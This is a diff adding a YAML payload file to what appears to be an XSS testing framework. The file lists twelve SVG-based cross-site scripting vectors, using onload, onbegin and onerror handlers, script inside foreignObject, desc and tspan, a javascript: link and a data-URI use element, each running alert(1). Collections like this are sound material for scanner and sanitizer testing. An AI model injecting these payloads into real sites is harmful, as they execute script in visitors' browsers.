@@ -1,0 +1,64 @@
+# XSS Framework — SVG Payload Set
+# SVG-specific XSS vectors leveraging SVG element events, script tags
+# inside SVG namespaces, and SVG animation elements.
+category: svg
+payloads:
+  - text: '<svg/onload=alert(1)>'
+    tags: [svg, onload, compact]
+    description: Compact SVG onload — no space between tag and attribute
+    severity: high
+
+  - text: '<svg onload=alert(1)>'
+    tags: [svg, onload, unquoted]
+    description: SVG onload without quotes
+    severity: high
+
+  - text: '<svg onload="alert(1)">'
+    tags: [svg, onload, double-quoted]
+    description: SVG onload with double-quoted handler
+    severity: high
+
+  - text: "<svg><script>alert(1)</script></svg>"
+    tags: [svg, script-injection, svg-script]
+    description: Script tag embedded inside SVG namespace
+    severity: high
+
+  - text: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
+    tags: [svg, animate, onbegin, svg-animation]
+    description: SVG animate element with onbegin event
+    severity: high
+
+  - text: '<svg><set onbegin=alert(1) attributeName=x>'
+    tags: [svg, set, onbegin, svg-animation]
+    description: SVG set element with onbegin event
+    severity: high
+
+  - text: '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
+    tags: [svg, foreignObject, script-injection]
+    description: Script injected via SVG foreignObject namespace escape
+    severity: high
+
+  - text: '<svg><desc><script>alert(1)</script></desc></svg>'
+    tags: [svg, desc, script-injection]
+    description: Script tag inside SVG desc element
+    severity: medium
+
+  - text: '<svg><text><tspan><script>alert(1)</script></tspan></text></svg>'
+    tags: [svg, text, tspan, script-injection]
+    description: Script inside SVG text > tspan
+    severity: medium
+
+  - text: '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>'
+    tags: [svg, anchor, javascript-url]
+    description: "SVG anchor with javascript: href"
+    severity: high
+
+  - text: '<svg><image href="x" onerror=alert(1)>'
+    tags: [svg, image, onerror]
+    description: SVG image element with onerror event
+    severity: high
+
+  - text: '<svg><use href="data:image/svg+xml,<svg id=''x'' xmlns=''http://www.w3.org/2000/svg''><script>alert(1)</script></svg>#x">'
+    tags: [svg, use, data-uri, nested-svg]
+    description: SVG use element referencing a data URI containing a nested SVG with script
+    severity: high
